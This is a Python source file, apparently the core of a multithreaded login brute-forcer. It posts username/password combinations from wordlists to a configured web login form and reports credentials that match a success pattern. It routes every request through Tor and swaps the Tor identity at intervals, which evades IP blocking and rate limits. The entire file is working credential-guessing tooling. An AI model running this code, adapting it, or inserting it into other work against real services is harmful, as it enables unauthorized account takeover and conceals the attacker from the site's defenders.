import logging
import re
import time
from configparser import ConfigParser
from multiprocessing import Lock, Condition
from multiprocessing.pool import ThreadPool

import requests
from requests.exceptions import ConnectionError, Timeout
from requests.adapters import HTTPAdapter
from alive_progress import alive_bar

from ..generator import PasswdGenerator, TupleGenerator
from ..onion import TorProxy
from .cli_parser import Args

__all__ = ["App"]


class App:
    def __init__(self, args: Args) -> None:
        self.consecutive_fails = 0
        self.lock = Lock()
        self.cond = Condition()

        self.count = 0
        self.count_lock = Lock()
        self.cookie_lock = Lock()

        self.logger = logging.getLogger(".".join(__name__.split(".")[1:]))
        self.cfg = ConfigParser()
        self.cfg.read(args.cfg_path)

        self.session: requests.Session = None
        self.target = re.compile(self.cfg["url-endpoints"]["target"])
        self.post_url = self.cfg["url-endpoints"]["post_url"]

        self.username_field = self.cfg["html-fields"]["username_field"]
        self.password_field = self.cfg["html-fields"]["password_field"]

        self.username_path = args.usernames
        self.password_path = args.passwords
        self.it_comb = args.it_comb
        self.each = args.each
        self.timeout = args.timeout
        self.max_tries = args.max_tries
        self.max_workers = args.threads

    def __del__(self) -> None:
        try:
            self.session.close()
        except:  # noqa
            pass

    def post_search(self, username_field: str, password_field: str) -> bool:
        response: requests.Response = None
        last_exception: str = None
        try_no = 0

        # 3 tries to connect to the target
        # connected if some response and status code is 200
        while try_no < self.max_tries and (not response or response.status_code != 200):
            try:
                with self.cookie_lock:
                    self.session.cookies.clear()
                response = self.session.post(
                    self.post_url,
                    data={
                        self.username_field: username_field,
                        self.password_field: password_field,
                    },
                    allow_redirects=True,  # maybe new page when successfull login
                    timeout=self.timeout,  # 10 secondes by default
                )
                if response and response.status_code == 200:
                    with self.lock:
                        self.consecutive_fails = 0
            except (ConnectionError, Timeout) as e:
                self.logger.debug(
                    "exception [%s] : retrying ... (%d/%d)",
                    last_exception := e.__class__.__name__,
                    try_no + 1,
                    self.max_tries,
                )
                time.sleep(1)  # wait to ~avoid~ spamming
            finally:
                try_no += 1
        else:
            if not response or response.status_code != 200:
                self.logger.error(
                    "failed multiple reconnect to target [%s]:[%s] : %s ❌",
                    username_field,
                    password_field,
                    last_exception,
                )
                with self.lock:
                    if self.consecutive_fails >= self.max_tries:
                        self.logger.critical("too many consecutive fails, exiting ... ❌")
                    self.consecutive_fails += 1

        if response and self.target.search(response.text):
            self.logger.info(
                "Login successful using [%s]:[%s] 🎉",
                username_field,
                password_field,
            )

    def rebuild_session(self, port: int):
        if self.session:
            self.session.close()
            del self.session
        self.session = requests.Session()
        self.session.mount(
            "http://",
            HTTPAdapter(
                pool_maxsize=self.max_workers,
                pool_connections=self.max_workers,
            ),
        )
        self.session.mount(
            "https://",
            HTTPAdapter(
                pool_maxsize=self.max_workers,
                pool_connections=self.max_workers,
            ),
        )
        self.session.proxies = {
            "http": f"socks5h://localhost:{port}",  # use Tor for HTTP connections
            "https": f"socks5h://localhost:{port}",  # use Tor for HTTPS connections
        }

    def bar(self, bar, digits: int, user_count: int, passwd_count: int, /):
        should_update_title = False  # do we change user ?
        with self.count_lock:  # protect self.count against all threads
            self.count += 1
            if self.count % passwd_count == 0:
                should_update_title = True
            if self.each > 0 and self.count % self.each == 0:  # last thread
                with self.cond:  # notify main thread
                    self.cond.notify(1)

        if should_update_title:
            bar.title(self.bar_title(self.count // passwd_count, digits, user_count))
        try:
            bar()
        except RuntimeError:
            # RuntimeError: dictionary changed size during iteration
            #
            # This is because of the `alive_bar` package
            # which uses a dict internally to store the
            # progress bar state.
            #
            # This error is raised when the progress bar
            # is updated while the bar is being rendered.
            #
            # This is not a problem because the progress
            # bar is only used to display the progress
            # and not to store the state.
            #
            # So we just ignore this error.
            pass

    @staticmethod
    def bar_title(i, digits, user_count, /) -> str:
        return f"on user {(i+1):0{digits}}/{user_count}"

    def run(self):
        user = PasswdGenerator(self.username_path, self.it_comb[0])
        passwd = PasswdGenerator(self.password_path, self.it_comb[1])
        generator = TupleGenerator(user, passwd)

        digits = len(str(user.count))  # number of digits in user count
        length = len(self.bar_title(0, digits, user.count))

        self.logger.info("Starting App 🚀")
        self.logger.info("Got %d users and %d passwords 🫧", user.count, passwd.count)

        def on_each():
            """setup session and bar title"""
            self.rebuild_session(tor.port)
            bar.title(self.bar_title(self.count // passwd.count, digits, user.count))

        # fmt: off
        with TorProxy(self.timeout, self.max_tries) as tor,\
            alive_bar(generator.count) as bar,\
            ThreadPool(self.max_workers) as pool:  # fmt: on

            if self.each == 0:  # initially setup session and bar title
                on_each()

            for i, u in enumerate(generator):
                if self.each > 0 and i % self.each == 0:
                    if i > 0:  # skip 1st time
                        self.logger.debug("waiting for last job to finish")
                        with self.cond:  # wait for last job to finish
                            self.cond.wait()

                        # swap Tor identity
                        bar.title(f"ID Swap ♻️{' '*(length-9)}")  # 9 = len("ID Swap ♻️")
                        tor.identity_swap()

                    on_each()

                # apply new tasks to thread pool
                pool.apply_async(
                    self.post_search,
                    args=(u[0], u[1]),
                    callback=lambda _: self.bar(bar, digits, user.count, passwd.count),
                )
            pool.close()
            pool.join()

        self.logger.info("Done ✅")
        self.session.close()
